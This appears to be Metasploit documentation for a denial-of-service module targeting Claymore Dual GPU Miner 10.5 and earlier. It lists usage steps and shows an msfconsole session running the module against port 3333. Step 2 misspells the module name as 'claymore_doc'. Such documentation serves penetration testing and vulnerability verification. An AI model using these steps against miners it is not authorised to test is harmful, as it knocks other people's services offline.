## Vulnerable Application

Vulnerable application versions include:
Claymore Dual GPU Miner<=10.5

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/dos/tcp/claymore_doc`
3. Do: `set rhost`
4. Do: `run`
5. check your miner.

## Scenarios

### Claymore Dual GPU Miner/10.0 - window7

```
msf5 > use auxiliary/dos/tcp/claymore_dos
msf5 auxiliary(dos/tcp/claymore_dos) > show options

Module options (auxiliary/dos/tcp/claymore_dos):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   rhost                   yes       The target address
   rport  3333             yes       The target port

msf5 auxiliary(dos/tcp/claymore_dos) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf5 auxiliary(dos/tcp/claymore_dos) > run

[*] Starting server...
[*] Creating sockets...
[*] Auxiliary module execution completed
```


